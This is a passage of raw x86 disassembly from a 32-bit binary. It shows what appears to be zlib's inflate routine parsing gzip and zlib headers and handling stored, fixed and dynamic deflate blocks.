   1ba5b:	mov    ecx,DWORD PTR [esi+0x30]
   1ba5e:	mov    edx,DWORD PTR [esi+0x28]
   1ba61:	cmp    ecx,edx
   1ba63:	jne    0x1ba69
   1ba65:	and    DWORD PTR [esi+0x30],0x0
   1ba69:	mov    ecx,DWORD PTR [esi+0x2c]
   1ba6c:	cmp    ecx,edx
   1ba6e:	jae    0x1ba75
   1ba70:	add    ecx,eax
   1ba72:	mov    DWORD PTR [esi+0x2c],ecx
   1ba75:	xor    eax,eax
   1ba77:	pop    esi
   1ba78:	pop    ebx
   1ba79:	leave  
   1ba7a:	ret    
   1ba7b:	int3   
   1ba7c:	int3   
   1ba7d:	int3   
   1ba7e:	int3   
   1ba7f:	int3   
   1ba80:	mov    edi,edi
   1ba82:	push   ebp
   1ba83:	mov    ebp,esp
   1ba85:	mov    edx,DWORD PTR [ebp+0x8]
   1ba88:	sub    esp,0x2c
   1ba8b:	push   ebx
   1ba8c:	xor    eax,eax
   1ba8e:	push   esi
   1ba8f:	push   edi
   1ba90:	cmp    edx,eax
   1ba92:	je     0x1bae2
   1ba94:	mov    esi,DWORD PTR [edx+0x1c]
   1ba97:	cmp    esi,eax
   1ba99:	je     0x1bae2
   1ba9b:	cmp    DWORD PTR [edx+0xc],eax
   1ba9e:	je     0x1bae2
   1baa0:	cmp    DWORD PTR [edx],eax
   1baa2:	jne    0x1baa9
   1baa4:	cmp    DWORD PTR [edx+0x4],eax
   1baa7:	jne    0x1bae2
   1baa9:	cmp    DWORD PTR [esi],0xb
   1baac:	jne    0x1bab4
   1baae:	mov    DWORD PTR [esi],0xc
   1bab4:	mov    eax,DWORD PTR [edx+0xc]
   1bab7:	mov    ecx,DWORD PTR [edx+0x10]
   1baba:	and    DWORD PTR [ebp-0x24],0x0
   1babe:	mov    ebx,DWORD PTR [esi+0x38]
   1bac1:	mov    edi,DWORD PTR [esi+0x3c]
   1bac4:	mov    DWORD PTR [ebp-0x18],eax
   1bac7:	mov    eax,DWORD PTR [edx]
   1bac9:	mov    DWORD PTR [ebp-0x4],eax
   1bacc:	mov    eax,DWORD PTR [edx+0x4]
   1bacf:	mov    DWORD PTR [ebp-0x8],eax
   1bad2:	mov    DWORD PTR [ebp-0x2c],eax
   1bad5:	mov    eax,DWORD PTR [esi]
   1bad7:	mov    DWORD PTR [ebp-0x10],ecx
   1bada:	mov    DWORD PTR [ebp-0x1c],ecx
   1badd:	cmp    eax,0x1c
   1bae0:	jbe    0x1baef
   1bae2:	push   0xfffffffe
   1bae4:	pop    eax
   1bae5:	pop    edi
   1bae6:	pop    esi
   1bae7:	pop    ebx
   1bae8:	leave  
   1bae9:	ret    0x8
   1baec:	mov    edx,DWORD PTR [ebp+0x8]
   1baef:	jmp    DWORD PTR [eax*4+0x1cc24]
   1baf6:	mov    eax,DWORD PTR [esi+0x8]
   1baf9:	test   eax,eax
   1bafb:	jne    0x1bb27
   1bafd:	mov    DWORD PTR [esi],0xc
   1bb03:	jmp    0x1caf5
   1bb08:	cmp    DWORD PTR [ebp-0x8],0x0
   1bb0c:	je     0x1cb43
   1bb12:	mov    ecx,DWORD PTR [ebp-0x4]
   1bb15:	movzx  edx,BYTE PTR [ecx]
   1bb18:	dec    DWORD PTR [ebp-0x8]
   1bb1b:	mov    ecx,edi
   1bb1d:	shl    edx,cl
   1bb1f:	add    ebx,edx
   1bb21:	inc    DWORD PTR [ebp-0x4]
   1bb24:	add    edi,0x8
   1bb27:	cmp    edi,0x10
   1bb2a:	jb     0x1bb08
   1bb2c:	test   al,0x2
   1bb2e:	je     0x1bb6b
   1bb30:	cmp    ebx,0x8b1f
   1bb36:	jne    0x1bb6b
   1bb38:	xor    edi,edi
   1bb3a:	push   edi
   1bb3b:	push   edi
   1bb3c:	push   edi
   1bb3d:	call   0x1d9a6
   1bb42:	mov    DWORD PTR [esi+0x18],eax
   1bb45:	push   0x2
   1bb47:	lea    eax,[ebp-0x14]
   1bb4a:	push   eax
   1bb4b:	mov    BYTE PTR [ebp-0x14],0x1f
   1bb4f:	mov    BYTE PTR [ebp-0x13],0x8b
   1bb53:	push   DWORD PTR [esi+0x18]
   1bb56:	call   0x1d9a6
   1bb5b:	mov    DWORD PTR [esi+0x18],eax
   1bb5e:	xor    ebx,ebx
   1bb60:	mov    DWORD PTR [esi],0x1
   1bb66:	jmp    0x1caf5
   1bb6b:	mov    eax,DWORD PTR [esi+0x20]
   1bb6e:	and    DWORD PTR [esi+0x10],0x0
   1bb72:	test   eax,eax
   1bb74:	je     0x1bb7a
   1bb76:	or     DWORD PTR [eax+0x30],0xffffffff
   1bb7a:	test   BYTE PTR [esi+0x8],0x1
   1bb7e:	je     0x1bc04
   1bb84:	movzx  eax,bl
   1bb87:	shl    eax,0x8
   1bb8a:	mov    ecx,ebx
   1bb8c:	shr    ecx,0x8
   1bb8f:	add    eax,ecx
   1bb91:	push   0x1f
   1bb93:	xor    edx,edx
   1bb95:	pop    ecx
   1bb96:	div    ecx
   1bb98:	test   edx,edx
   1bb9a:	jne    0x1bc04
   1bb9c:	mov    eax,ebx
   1bb9e:	and    al,0xf
   1bba0:	cmp    al,0x8
   1bba2:	je     0x1bbb3
   1bba4:	mov    eax,DWORD PTR [ebp+0x8]
   1bba7:	mov    DWORD PTR [eax+0x18],0x1ed92
   1bbae:	jmp    0x1caef
   1bbb3:	shr    ebx,0x4
   1bbb6:	mov    ecx,ebx
   1bbb8:	and    ecx,0xf
   1bbbb:	add    ecx,0x8
   1bbbe:	sub    edi,0x4
   1bbc1:	cmp    ecx,DWORD PTR [esi+0x24]
   1bbc4:	jbe    0x1bbd5
   1bbc6:	mov    eax,DWORD PTR [ebp+0x8]
   1bbc9:	mov    DWORD PTR [eax+0x18],0x1ed7e
   1bbd0:	jmp    0x1caef
   1bbd5:	xor    eax,eax
   1bbd7:	xor    edi,edi
   1bbd9:	inc    eax
   1bbda:	push   edi
   1bbdb:	shl    eax,cl
   1bbdd:	push   edi
   1bbde:	push   edi
   1bbdf:	mov    DWORD PTR [esi+0x14],eax
   1bbe2:	call   0x1d504
   1bbe7:	mov    ecx,DWORD PTR [ebp+0x8]
   1bbea:	shr    ebx,0x8
   1bbed:	not    ebx
   1bbef:	and    ebx,0x2
   1bbf2:	or     ebx,0x9
   1bbf5:	mov    DWORD PTR [esi+0x18],eax
   1bbf8:	mov    DWORD PTR [ecx+0x30],eax
   1bbfb:	mov    DWORD PTR [esi],ebx
   1bbfd:	xor    ebx,ebx
   1bbff:	jmp    0x1caf5
   1bc04:	mov    eax,DWORD PTR [ebp+0x8]
   1bc07:	mov    DWORD PTR [eax+0x18],0x1ed66
   1bc0e:	jmp    0x1caef
   1bc13:	cmp    edi,0x10
   1bc16:	jae    0x1bc3f
   1bc18:	cmp    DWORD PTR [ebp-0x8],0x0
   1bc1c:	je     0x1cb43
   1bc22:	mov    eax,DWORD PTR [ebp-0x4]
   1bc25:	movzx  eax,BYTE PTR [eax]
   1bc28:	dec    DWORD PTR [ebp-0x8]
   1bc2b:	mov    ecx,edi
   1bc2d:	shl    eax,cl
   1bc2f:	add    edi,0x8
   1bc32:	add    ebx,eax
   1bc34:	inc    DWORD PTR [ebp-0x4]
   1bc37:	cmp    edi,0x10
   1bc3a:	jb     0x1bc18
   1bc3c:	mov    edx,DWORD PTR [ebp+0x8]
   1bc3f:	mov    DWORD PTR [esi+0x10],ebx
   1bc42:	cmp    bl,0x8
   1bc45:	je     0x1bc53
   1bc47:	mov    DWORD PTR [edx+0x18],0x1ed92
   1bc4e:	jmp    0x1caef
   1bc53:	test   ebx,0xe000
   1bc59:	je     0x1bc67
   1bc5b:	mov    DWORD PTR [edx+0x18],0x1ed4c
   1bc62:	jmp    0x1caef
   1bc67:	mov    eax,DWORD PTR [esi+0x20]
   1bc6a:	test   eax,eax
   1bc6c:	je     0x1bc78
   1bc6e:	mov    ecx,ebx
   1bc70:	shr    ecx,0x8
   1bc73:	and    ecx,0x1
   1bc76:	mov    DWORD PTR [eax],ecx
   1bc78:	test   DWORD PTR [esi+0x10],0x200
   1bc7f:	je     0x1bc9e
   1bc81:	mov    BYTE PTR [ebp-0x14],bl
   1bc84:	push   0x2
   1bc86:	lea    eax,[ebp-0x14]
   1bc89:	shr    ebx,0x8
   1bc8c:	push   eax
   1bc8d:	mov    BYTE PTR [ebp-0x13],bl
   1bc90:	push   DWORD PTR [esi+0x18]
   1bc93:	call   0x1d9a6
   1bc98:	mov    edx,DWORD PTR [ebp+0x8]
   1bc9b:	mov    DWORD PTR [esi+0x18],eax
   1bc9e:	xor    ebx,ebx
   1bca0:	xor    edi,edi
   1bca2:	mov    DWORD PTR [esi],0x2
   1bca8:	cmp    edi,0x20
   1bcab:	jae    0x1bcd4
   1bcad:	cmp    DWORD PTR [ebp-0x8],0x0
   1bcb1:	je     0x1cb43
   1bcb7:	mov    eax,DWORD PTR [ebp-0x4]
   1bcba:	movzx  eax,BYTE PTR [eax]
   1bcbd:	dec    DWORD PTR [ebp-0x8]
   1bcc0:	mov    ecx,edi
   1bcc2:	shl    eax,cl
   1bcc4:	add    edi,0x8
   1bcc7:	add    ebx,eax
   1bcc9:	inc    DWORD PTR [ebp-0x4]
   1bccc:	cmp    edi,0x20
   1bccf:	jb     0x1bcad
   1bcd1:	mov    edx,DWORD PTR [ebp+0x8]
   1bcd4:	mov    eax,DWORD PTR [esi+0x20]
   1bcd7:	test   eax,eax
   1bcd9:	je     0x1bcde
   1bcdb:	mov    DWORD PTR [eax+0x4],ebx
   1bcde:	test   DWORD PTR [esi+0x10],0x200
   1bce5:	je     0x1bd14
   1bce7:	mov    eax,ebx
   1bce9:	shr    eax,0x8
   1bcec:	mov    BYTE PTR [ebp-0x13],al
   1bcef:	mov    eax,ebx
   1bcf1:	shr    eax,0x10
   1bcf4:	mov    BYTE PTR [ebp-0x12],al
   1bcf7:	mov    BYTE PTR [ebp-0x14],bl
   1bcfa:	push   0x4
   1bcfc:	lea    eax,[ebp-0x14]
   1bcff:	shr    ebx,0x18
   1bd02:	push   eax
   1bd03:	mov    BYTE PTR [ebp-0x11],bl
   1bd06:	push   DWORD PTR [esi+0x18]
   1bd09:	call   0x1d9a6
   1bd0e:	mov    edx,DWORD PTR [ebp+0x8]
   1bd11:	mov    DWORD PTR [esi+0x18],eax
   1bd14:	xor    ebx,ebx
   1bd16:	xor    edi,edi
   1bd18:	mov    DWORD PTR [esi],0x3
   1bd1e:	cmp    edi,0x10
   1bd21:	jae    0x1bd4a
   1bd23:	cmp    DWORD PTR [ebp-0x8],0x0
   1bd27:	je     0x1cb43
   1bd2d:	mov    eax,DWORD PTR [ebp-0x4]
   1bd30:	movzx  eax,BYTE PTR [eax]
   1bd33:	dec    DWORD PTR [ebp-0x8]
   1bd36:	mov    ecx,edi
   1bd38:	shl    eax,cl
   1bd3a:	add    edi,0x8
   1bd3d:	add    ebx,eax
   1bd3f:	inc    DWORD PTR [ebp-0x4]
   1bd42:	cmp    edi,0x10
   1bd45:	jb     0x1bd23
   1bd47:	mov    edx,DWORD PTR [ebp+0x8]
   1bd4a:	mov    eax,DWORD PTR [esi+0x20]
   1bd4d:	test   eax,eax
   1bd4f:	je     0x1bd67
   1bd51:	mov    ecx,ebx
   1bd53:	and    ecx,0xff
   1bd59:	mov    DWORD PTR [eax+0x8],ecx
   1bd5c:	mov    ecx,DWORD PTR [esi+0x20]
   1bd5f:	mov    eax,ebx
   1bd61:	shr    eax,0x8
   1bd64:	mov    DWORD PTR [ecx+0xc],eax
   1bd67:	test   DWORD PTR [esi+0x10],0x200
   1bd6e:	je     0x1bd8d
   1bd70:	mov    BYTE PTR [ebp-0x14],bl
   1bd73:	push   0x2
   1bd75:	lea    eax,[ebp-0x14]
   1bd78:	shr    ebx,0x8
   1bd7b:	push   eax
   1bd7c:	mov    BYTE PTR [ebp-0x13],bl
   1bd7f:	push   DWORD PTR [esi+0x18]
   1bd82:	call   0x1d9a6
   1bd87:	mov    edx,DWORD PTR [ebp+0x8]
   1bd8a:	mov    DWORD PTR [esi+0x18],eax
   1bd8d:	xor    ebx,ebx
   1bd8f:	xor    edi,edi
   1bd91:	mov    DWORD PTR [esi],0x4
   1bd97:	test   DWORD PTR [esi+0x10],0x400
   1bd9e:	je     0x1be05
   1bda0:	cmp    edi,0x10
   1bda3:	jae    0x1bdcc
   1bda5:	cmp    DWORD PTR [ebp-0x8],0x0
   1bda9:	je     0x1cb43
   1bdaf:	mov    eax,DWORD PTR [ebp-0x4]
   1bdb2:	movzx  eax,BYTE PTR [eax]
   1bdb5:	dec    DWORD PTR [ebp-0x8]
   1bdb8:	mov    ecx,edi
   1bdba:	shl    eax,cl
   1bdbc:	add    edi,0x8
   1bdbf:	add    ebx,eax
   1bdc1:	inc    DWORD PTR [ebp-0x4]
   1bdc4:	cmp    edi,0x10
   1bdc7:	jb     0x1bda5
   1bdc9:	mov    edx,DWORD PTR [ebp+0x8]
   1bdcc:	mov    eax,DWORD PTR [esi+0x20]
   1bdcf:	mov    DWORD PTR [esi+0x40],ebx
   1bdd2:	test   eax,eax
   1bdd4:	je     0x1bdd9
   1bdd6:	mov    DWORD PTR [eax+0x14],ebx
   1bdd9:	test   DWORD PTR [esi+0x10],0x200
   1bde0:	je     0x1bdff
   1bde2:	mov    BYTE PTR [ebp-0x14],bl
   1bde5:	push   0x2
   1bde7:	lea    eax,[ebp-0x14]
   1bdea:	shr    ebx,0x8
   1bded:	push   eax
   1bdee:	mov    BYTE PTR [ebp-0x13],bl
   1bdf1:	push   DWORD PTR [esi+0x18]
   1bdf4:	call   0x1d9a6
   1bdf9:	mov    edx,DWORD PTR [ebp+0x8]
   1bdfc:	mov    DWORD PTR [esi+0x18],eax
   1bdff:	xor    ebx,ebx
   1be01:	xor    edi,edi
   1be03:	jmp    0x1be10
   1be05:	mov    eax,DWORD PTR [esi+0x20]
   1be08:	test   eax,eax
   1be0a:	je     0x1be10
   1be0c:	and    DWORD PTR [eax+0x10],0x0
   1be10:	mov    DWORD PTR [esi],0x5
   1be16:	test   DWORD PTR [esi+0x10],0x400
   1be1d:	je     0x1bea7
   1be23:	mov    edx,DWORD PTR [esi+0x40]
   1be26:	mov    eax,DWORD PTR [ebp-0x8]
   1be29:	mov    DWORD PTR [ebp-0xc],edx
   1be2c:	cmp    edx,eax
   1be2e:	jbe    0x1be33
   1be30:	mov    DWORD PTR [ebp-0xc],eax
   1be33:	cmp    DWORD PTR [ebp-0xc],0x0
   1be37:	je     0x1be9a
   1be39:	mov    ecx,DWORD PTR [esi+0x20]
   1be3c:	test   ecx,ecx
   1be3e:	je     0x1be74
   1be40:	mov    eax,DWORD PTR [ecx+0x10]
   1be43:	mov    DWORD PTR [ebp-0x28],eax
   1be46:	test   eax,eax
   1be48:	je     0x1be74
   1be4a:	mov    eax,DWORD PTR [ecx+0x14]
   1be4d:	mov    ecx,DWORD PTR [ecx+0x18]
   1be50:	sub    eax,edx
   1be52:	mov    edx,DWORD PTR [ebp-0xc]
   1be55:	add    edx,eax
   1be57:	cmp    edx,ecx
   1be59:	jbe    0x1be5f
   1be5b:	sub    ecx,eax
   1be5d:	jmp    0x1be62
   1be5f:	mov    ecx,DWORD PTR [ebp-0xc]
   1be62:	push   ecx
   1be63:	mov    ecx,DWORD PTR [ebp-0x28]
   1be66:	push   DWORD PTR [ebp-0x4]
   1be69:	add    ecx,eax
   1be6b:	push   ecx
   1be6c:	call   0x1da7a
   1be71:	add    esp,0xc
   1be74:	test   DWORD PTR [esi+0x10],0x200
   1be7b:	je     0x1be8e
   1be7d:	push   DWORD PTR [ebp-0xc]
   1be80:	push   DWORD PTR [ebp-0x4]
   1be83:	push   DWORD PTR [esi+0x18]
   1be86:	call   0x1d9a6
   1be8b:	mov    DWORD PTR [esi+0x18],eax
   1be8e:	mov    eax,DWORD PTR [ebp-0xc]
   1be91:	sub    DWORD PTR [ebp-0x8],eax
   1be94:	add    DWORD PTR [ebp-0x4],eax
   1be97:	sub    DWORD PTR [esi+0x40],eax
   1be9a:	cmp    DWORD PTR [esi+0x40],0x0
   1be9e:	jne    0x1cb43
   1bea4:	mov    edx,DWORD PTR [ebp+0x8]
   1bea7:	and    DWORD PTR [esi+0x40],0x0
   1beab:	mov    DWORD PTR [esi],0x6
   1beb1:	test   DWORD PTR [esi+0x10],0x800
   1beb8:	je     0x1bf35
   1beba:	cmp    DWORD PTR [ebp-0x8],0x0
   1bebe:	je     0x1cb43
   1bec4:	xor    ecx,ecx
   1bec6:	mov    eax,DWORD PTR [ebp-0x4]
   1bec9:	movzx  eax,BYTE PTR [ecx+eax*1]
   1becd:	inc    ecx
   1bece:	mov    DWORD PTR [ebp-0xc],ecx
   1bed1:	mov    ecx,DWORD PTR [esi+0x20]
   1bed4:	mov    DWORD PTR [ebp-0x20],eax
   1bed7:	test   ecx,ecx
   1bed9:	je     0x1bef6
   1bedb:	mov    edx,DWORD PTR [ecx+0x1c]
   1bede:	mov    DWORD PTR [ebp-0x28],edx
   1bee1:	test   edx,edx
   1bee3:	je     0x1bef6
   1bee5:	mov    edx,DWORD PTR [esi+0x40]
   1bee8:	cmp    edx,DWORD PTR [ecx+0x20]
   1beeb:	jae    0x1bef6
   1beed:	mov    ecx,DWORD PTR [ebp-0x28]
   1bef0:	mov    BYTE PTR [ecx+edx*1],al
   1bef3:	inc    DWORD PTR [esi+0x40]
   1bef6:	test   eax,eax
   1bef8:	je     0x1bf02
   1befa:	mov    ecx,DWORD PTR [ebp-0xc]
   1befd:	cmp    ecx,DWORD PTR [ebp-0x8]
   1bf00:	jb     0x1bec6
   1bf02:	test   DWORD PTR [esi+0x10],0x200
   1bf09:	je     0x1bf1f
   1bf0b:	push   DWORD PTR [ebp-0xc]
   1bf0e:	push   DWORD PTR [ebp-0x4]
   1bf11:	push   DWORD PTR [esi+0x18]
   1bf14:	call   0x1d9a6
   1bf19:	mov    DWORD PTR [esi+0x18],eax
   1bf1c:	mov    eax,DWORD PTR [ebp-0x20]
   1bf1f:	mov    ecx,DWORD PTR [ebp-0xc]
   1bf22:	sub    DWORD PTR [ebp-0x8],ecx
   1bf25:	add    DWORD PTR [ebp-0x4],ecx
   1bf28:	test   eax,eax
   1bf2a:	jne    0x1cb43
   1bf30:	mov    edx,DWORD PTR [ebp+0x8]
   1bf33:	jmp    0x1bf40
   1bf35:	mov    eax,DWORD PTR [esi+0x20]
   1bf38:	test   eax,eax
   1bf3a:	je     0x1bf40
   1bf3c:	and    DWORD PTR [eax+0x1c],0x0
   1bf40:	and    DWORD PTR [esi+0x40],0x0
   1bf44:	mov    DWORD PTR [esi],0x7
   1bf4a:	test   DWORD PTR [esi+0x10],0x1000
   1bf51:	je     0x1bfce
   1bf53:	cmp    DWORD PTR [ebp-0x8],0x0
   1bf57:	je     0x1cb43
   1bf5d:	xor    ecx,ecx
   1bf5f:	mov    eax,DWORD PTR [ebp-0x4]
   1bf62:	movzx  eax,BYTE PTR [ecx+eax*1]
   1bf66:	inc    ecx
   1bf67:	mov    DWORD PTR [ebp-0xc],ecx
   1bf6a:	mov    ecx,DWORD PTR [esi+0x20]
   1bf6d:	mov    DWORD PTR [ebp-0x20],eax
   1bf70:	test   ecx,ecx
   1bf72:	je     0x1bf8f
   1bf74:	mov    edx,DWORD PTR [ecx+0x24]
   1bf77:	mov    DWORD PTR [ebp-0x28],edx
   1bf7a:	test   edx,edx
   1bf7c:	je     0x1bf8f
   1bf7e:	mov    edx,DWORD PTR [esi+0x40]
   1bf81:	cmp    edx,DWORD PTR [ecx+0x28]
   1bf84:	jae    0x1bf8f
   1bf86:	mov    ecx,DWORD PTR [ebp-0x28]
   1bf89:	mov    BYTE PTR [ecx+edx*1],al
   1bf8c:	inc    DWORD PTR [esi+0x40]
   1bf8f:	test   eax,eax
   1bf91:	je     0x1bf9b
   1bf93:	mov    ecx,DWORD PTR [ebp-0xc]
   1bf96:	cmp    ecx,DWORD PTR [ebp-0x8]
   1bf99:	jb     0x1bf5f
   1bf9b:	test   DWORD PTR [esi+0x10],0x200
   1bfa2:	je     0x1bfb8
   1bfa4:	push   DWORD PTR [ebp-0xc]
   1bfa7:	push   DWORD PTR [ebp-0x4]
   1bfaa:	push   DWORD PTR [esi+0x18]
   1bfad:	call   0x1d9a6
   1bfb2:	mov    DWORD PTR [esi+0x18],eax
   1bfb5:	mov    eax,DWORD PTR [ebp-0x20]
   1bfb8:	mov    ecx,DWORD PTR [ebp-0xc]
   1bfbb:	sub    DWORD PTR [ebp-0x8],ecx
   1bfbe:	add    DWORD PTR [ebp-0x4],ecx
   1bfc1:	test   eax,eax
   1bfc3:	jne    0x1cb43
   1bfc9:	mov    edx,DWORD PTR [ebp+0x8]
   1bfcc:	jmp    0x1bfd9
   1bfce:	mov    eax,DWORD PTR [esi+0x20]
   1bfd1:	test   eax,eax
   1bfd3:	je     0x1bfd9
   1bfd5:	and    DWORD PTR [eax+0x24],0x0
   1bfd9:	mov    DWORD PTR [esi],0x8
   1bfdf:	test   DWORD PTR [esi+0x10],0x200
   1bfe6:	je     0x1c02c
   1bfe8:	cmp    edi,0x10
   1bfeb:	jae    0x1c014
   1bfed:	cmp    DWORD PTR [ebp-0x8],0x0
   1bff1:	je     0x1cb43
   1bff7:	mov    eax,DWORD PTR [ebp-0x4]
   1bffa:	movzx  eax,BYTE PTR [eax]
   1bffd:	dec    DWORD PTR [ebp-0x8]
   1c000:	mov    ecx,edi
   1c002:	shl    eax,cl
   1c004:	add    edi,0x8
   1c007:	add    ebx,eax
   1c009:	inc    DWORD PTR [ebp-0x4]
   1c00c:	cmp    edi,0x10
   1c00f:	jb     0x1bfed
   1c011:	mov    edx,DWORD PTR [ebp+0x8]
   1c014:	movzx  eax,WORD PTR [esi+0x18]
   1c018:	cmp    ebx,eax
   1c01a:	je     0x1c028
   1c01c:	mov    DWORD PTR [edx+0x18],0x1ed38
   1c023:	jmp    0x1caef
   1c028:	xor    ebx,ebx
   1c02a:	xor    edi,edi
   1c02c:	mov    eax,DWORD PTR [esi+0x20]
   1c02f:	test   eax,eax
   1c031:	je     0x1c047
   1c033:	mov    edx,DWORD PTR [esi+0x10]
   1c036:	xor    ecx,ecx
   1c038:	inc    ecx
   1c039:	sar    edx,0x9
   1c03c:	and    edx,ecx
   1c03e:	mov    DWORD PTR [eax+0x2c],edx
   1c041:	mov    eax,DWORD PTR [esi+0x20]
   1c044:	mov    DWORD PTR [eax+0x30],ecx
   1c047:	xor    eax,eax
   1c049:	push   eax
   1c04a:	push   eax
   1c04b:	push   eax
   1c04c:	call   0x1d9a6
   1c051:	mov    ecx,DWORD PTR [ebp+0x8]
   1c054:	mov    DWORD PTR [esi+0x18],eax
   1c057:	mov    DWORD PTR [ecx+0x30],eax
   1c05a:	jmp    0x1c758
   1c05f:	cmp    edi,0x20
   1c062:	jae    0x1c08b
   1c064:	cmp    DWORD PTR [ebp-0x8],0x0
   1c068:	je     0x1cb43
   1c06e:	mov    eax,DWORD PTR [ebp-0x4]
   1c071:	movzx  eax,BYTE PTR [eax]
   1c074:	dec    DWORD PTR [ebp-0x8]
   1c077:	mov    ecx,edi
   1c079:	shl    eax,cl
   1c07b:	add    edi,0x8
   1c07e:	add    ebx,eax
   1c080:	inc    DWORD PTR [ebp-0x4]
   1c083:	cmp    edi,0x20
   1c086:	jb     0x1c064
   1c088:	mov    edx,DWORD PTR [ebp+0x8]
   1c08b:	mov    ecx,ebx
   1c08d:	mov    eax,0xff00
   1c092:	and    ecx,eax
   1c094:	mov    edi,ebx
   1c096:	shl    edi,0x10
   1c099:	add    ecx,edi
   1c09b:	mov    edi,ebx
   1c09d:	shr    edi,0x8
   1c0a0:	and    edi,eax
   1c0a2:	shl    ecx,0x8
   1c0a5:	shr    ebx,0x18
   1c0a8:	add    ecx,edi
   1c0aa:	lea    eax,[ecx+ebx*1]
   1c0ad:	mov    DWORD PTR [esi+0x18],eax
   1c0b0:	mov    DWORD PTR [edx+0x30],eax
   1c0b3:	xor    ebx,ebx
   1c0b5:	xor    edi,edi
   1c0b7:	mov    DWORD PTR [esi],0xa
   1c0bd:	cmp    DWORD PTR [esi+0xc],0x0
   1c0c1:	je     0x1cb05
   1c0c7:	xor    eax,eax
   1c0c9:	push   eax
   1c0ca:	push   eax
   1c0cb:	push   eax
   1c0cc:	call   0x1d504
   1c0d1:	mov    ecx,DWORD PTR [ebp+0x8]
   1c0d4:	mov    DWORD PTR [esi+0x18],eax
   1c0d7:	mov    DWORD PTR [ecx+0x30],eax
   1c0da:	mov    DWORD PTR [esi],0xb
   1c0e0:	cmp    DWORD PTR [ebp+0xc],0x5
   1c0e4:	je     0x1cb43
   1c0ea:	mov    edx,DWORD PTR [ebp+0x8]
   1c0ed:	cmp    DWORD PTR [esi+0x4],0x0
   1c0f1:	je     0x1c107
   1c0f3:	mov    ecx,edi
   1c0f5:	and    ecx,0x7
   1c0f8:	shr    ebx,cl
   1c0fa:	sub    edi,ecx
   1c0fc:	mov    DWORD PTR [esi],0x18
   1c102:	jmp    0x1caf5
   1c107:	cmp    edi,0x3
   1c10a:	jae    0x1c133
   1c10c:	cmp    DWORD PTR [ebp-0x8],0x0
   1c110:	je     0x1cb43
   1c116:	mov    eax,DWORD PTR [ebp-0x4]
   1c119:	movzx  eax,BYTE PTR [eax]
   1c11c:	dec    DWORD PTR [ebp-0x8]
   1c11f:	mov    ecx,edi
   1c121:	shl    eax,cl
   1c123:	add    edi,0x8
   1c126:	add    ebx,eax
   1c128:	inc    DWORD PTR [ebp-0x4]
   1c12b:	cmp    edi,0x3
   1c12e:	jb     0x1c10c
   1c130:	mov    edx,DWORD PTR [ebp+0x8]
   1c133:	mov    eax,ebx
   1c135:	and    eax,0x1
   1c138:	shr    ebx,1
   1c13a:	mov    DWORD PTR [esi+0x4],eax
   1c13d:	mov    eax,ebx
   1c13f:	and    eax,0x3
   1c142:	dec    edi
   1c143:	sub    eax,0x0
   1c146:	je     0x1c18c
   1c148:	dec    eax
   1c149:	je     0x1c168
   1c14b:	dec    eax
   1c14c:	je     0x1c160
   1c14e:	dec    eax
   1c14f:	jne    0x1c192
   1c151:	mov    DWORD PTR [edx+0x18],0x1ed24
   1c158:	mov    DWORD PTR [esi],0x1b
   1c15e:	jmp    0x1c192
   1c160:	mov    DWORD PTR [esi],0xf
   1c166:	jmp    0x1c192
   1c168:	mov    DWORD PTR [esi+0x4c],0x7b570
   1c16f:	mov    DWORD PTR [esi+0x54],0x9
   1c176:	mov    DWORD PTR [esi+0x50],0x7bd70
   1c17d:	mov    DWORD PTR [esi+0x58],0x5
   1c184:	mov    DWORD PTR [esi],0x12
   1c18a:	jmp    0x1c192
   1c18c:	mov    DWORD PTR [esi],0xd
   1c192:	shr    ebx,0x2
   1c195:	dec    edi
   1c196:	dec    edi
   1c197:	jmp    0x1caf5
   1c19c:	mov    ecx,edi
   1c19e:	and    ecx,0x7
   1c1a1:	sub    edi,ecx
   1c1a3:	shr    ebx,cl
   1c1a5:	cmp    edi,0x20
   1c1a8:	jae    0x1c1d1
   1c1aa:	cmp    DWORD PTR [ebp-0x8],0x0
   1c1ae:	je     0x1cb43
   1c1b4:	mov    eax,DWORD PTR [ebp-0x4]
   1c1b7:	movzx  eax,BYTE PTR [eax]
   1c1ba:	dec    DWORD PTR [ebp-0x8]
   1c1bd:	mov    ecx,edi
   1c1bf:	shl    eax,cl
   1c1c1:	add    edi,0x8
   1c1c4:	add    ebx,eax
   1c1c6:	inc    DWORD PTR [ebp-0x4]
   1c1c9:	cmp    edi,0x20
   1c1cc:	jb     0x1c1aa
   1c1ce:	mov    edx,DWORD PTR [ebp+0x8]
   1c1d1:	mov    ecx,ebx
   1c1d3:	mov    eax,ebx
   1c1d5:	not    ecx
   1c1d7:	and    eax,0xffff
   1c1dc:	shr    ecx,0x10
   1c1df:	cmp    eax,ecx
   1c1e1:	je     0x1c1ef
   1c1e3:	mov    DWORD PTR [edx+0x18],0x1ed06
   1c1ea:	jmp    0x1caef
   1c1ef:	xor    ebx,ebx
   1c1f1:	mov    DWORD PTR [esi+0x40],eax
   1c1f4:	xor    edi,edi
   1c1f6:	mov    DWORD PTR [esi],0xe
   1c1fc:	mov    eax,DWORD PTR [esi+0x40]
   1c1ff:	mov    DWORD PTR [ebp-0xc],eax
   1c202:	test   eax,eax
   1c204:	je     0x1c758
   1c20a:	mov    eax,DWORD PTR [ebp-0x8]
   1c20d:	cmp    DWORD PTR [ebp-0xc],eax
   1c210:	jbe    0x1c215
   1c212:	mov    DWORD PTR [ebp-0xc],eax
   1c215:	mov    eax,DWORD PTR [ebp-0x10]
   1c218:	cmp    DWORD PTR [ebp-0xc],eax
   1c21b:	jbe    0x1c220
   1c21d:	mov    DWORD PTR [ebp-0xc],eax
   1c220:	cmp    DWORD PTR [ebp-0xc],0x0
   1c224:	je     0x1cb43
   1c22a:	push   DWORD PTR [ebp-0xc]
   1c22d:	push   DWORD PTR [ebp-0x4]
   1c230:	push   DWORD PTR [ebp-0x18]
   1c233:	call   0x1da7a
   1c238:	mov    eax,DWORD PTR [ebp-0xc]
   1c23b:	sub    DWORD PTR [ebp-0x8],eax
   1c23e:	add    DWORD PTR [ebp-0x4],eax
   1c241:	sub    DWORD PTR [ebp-0x10],eax
   1c244:	add    DWORD PTR [ebp-0x18],eax
   1c247:	add    esp,0xc
   1c24a:	sub    DWORD PTR [esi+0x40],eax
   1c24d:	jmp    0x1caf5
   1c252:	cmp    edi,0xe
   1c255:	jae    0x1c27e
   1c257:	cmp    DWORD PTR [ebp-0x8],0x0
   1c25b:	je     0x1cb43
   1c261:	mov    eax,DWORD PTR [ebp-0x4]
   1c264:	movzx  eax,BYTE PTR [eax]
   1c267:	dec    DWORD PTR [ebp-0x8]
   1c26a:	mov    ecx,edi
